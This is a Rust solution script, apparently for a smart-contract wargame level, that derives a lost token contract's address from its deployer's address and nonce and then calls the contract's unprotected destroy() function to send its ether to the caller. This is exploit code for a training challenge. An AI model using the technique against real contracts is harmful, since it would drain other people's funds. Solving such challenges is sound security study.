use crate::types::*;
use crate::utils;
use ethers;
use ethers::prelude::*;
use std::error::Error;
use std::sync::Arc;

abigen!(
    LevelContract,
    r#"[
        function destroy(address payable _to) public
    ]"#,
);

pub async fn solve(level: &Level, config: &EnvironmentConfig) -> Result<(), Box<dyn Error>> {
    let client = Arc::new(utils::create_signer_middleware(
        config.wallet_mnemonic_path.clone(),
        config.network.chain_id,
        config.network.rpc.clone(),
    )?);

    let level_address = level.instance.parse::<Address>()?;
    let nonce = client.get_transaction_count(level_address, None).await?;
    println!("nonce: {}", nonce);

    // Calculate token contract address, keccak256 of RLP encoded [deployer address, deployer nonce]
    // Generate RLP encoded input bytes
    let mut input_bytes = vec![0xd6, 0x94];
    input_bytes.append(&mut Vec::from(level_address.as_bytes()));
    input_bytes.push(nonce.as_usize() as u8 - 1);
    let token_address = H160::from(H256::from(ethers::utils::keccak256(input_bytes)));
    println!("token address: {:?}", token_address);

    let contract = LevelContract::new(token_address, client.clone());
    let receipt = contract
        .destroy(client.default_sender().unwrap())
        .legacy()
        .send()
        .await?
        .await?;
    println!("destroy():\n{}", serde_json::to_string_pretty(&receipt)?);

    Ok(())
}
